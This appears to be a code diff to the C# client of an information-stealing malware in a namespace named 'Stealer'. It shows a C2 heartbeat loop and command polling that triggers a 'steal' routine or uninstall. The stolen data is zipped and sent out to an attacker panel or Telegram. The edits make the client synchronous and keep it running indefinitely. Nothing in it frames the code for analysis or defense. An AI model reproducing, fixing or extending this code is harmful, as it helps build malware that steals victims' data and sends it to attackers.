@@ -12,6 +12,7 @@ namespace Stealer
         private static readonly int CommandPollInterval = 10000;
         private static string _clientId;
 
+        [STAThread]
         static void Main(string[] args)
         {
             try
@@ -26,21 +27,16 @@ namespace Stealer
 
                 CommandLoop();
             }
-            catch
-            {
-                Thread.Sleep(60000);
-            }
+            catch { }
+
+            while (true) { Thread.Sleep(60000); }
         }
 
         private static void HeartbeatLoop()
         {
             while (true)
             {
-                try
-                {
-                    C2Client.SendHeartbeat(_clientId).GetAwaiter().GetResult();
-                }
-                catch { }
+                try { C2Client.SendHeartbeat(_clientId); } catch { }
                 Thread.Sleep(HeartbeatInterval);
             }
         }
@@ -52,19 +48,11 @@ namespace Stealer
                 try
                 {
                     string cmd = null;
-                    try
-                    {
-                        cmd = C2Client.PollCommand(_clientId).GetAwaiter().GetResult();
-                    }
-                    catch { }
+                    try { cmd = C2Client.PollCommand(_clientId); } catch { }
 
                     if (!string.IsNullOrEmpty(cmd))
                     {
-                        try
-                        {
-                            HandleCommand(cmd).GetAwaiter().GetResult();
-                        }
-                        catch { }
+                        HandleCommand(cmd);
                     }
                 }
                 catch { }
@@ -72,12 +60,12 @@ namespace Stealer
             }
         }
 
-        private static async Task HandleCommand(string command)
+        private static void HandleCommand(string command)
         {
             switch (command.ToLower().Trim())
             {
                 case "steal":
-                    await RunStealer();
+                    RunStealer();
                     break;
                 case "uninstall":
                     try { Persistence.Uninstall(); } catch { }
@@ -86,7 +74,7 @@ namespace Stealer
             }
         }
 
-        private static async Task RunStealer()
+        private static void RunStealer()
         {
             try
             {
@@ -108,11 +96,11 @@ namespace Stealer
 
                     if (Config.Delivery.Equals("PANEL", StringComparison.OrdinalIgnoreCase))
                     {
-                        await PanelSender.SendZipAsync(zipData, fileName);
+                        Task.Run(() => PanelSender.SendZipAsync(zipData, fileName)).GetAwaiter().GetResult();
                     }
                     else
                     {
-                        await TelegramSender.SendZipAsync(zipData, fileName);
+                        Task.Run(() => TelegramSender.SendZipAsync(zipData, fileName)).GetAwaiter().GetResult();
                     }
                 }
             }
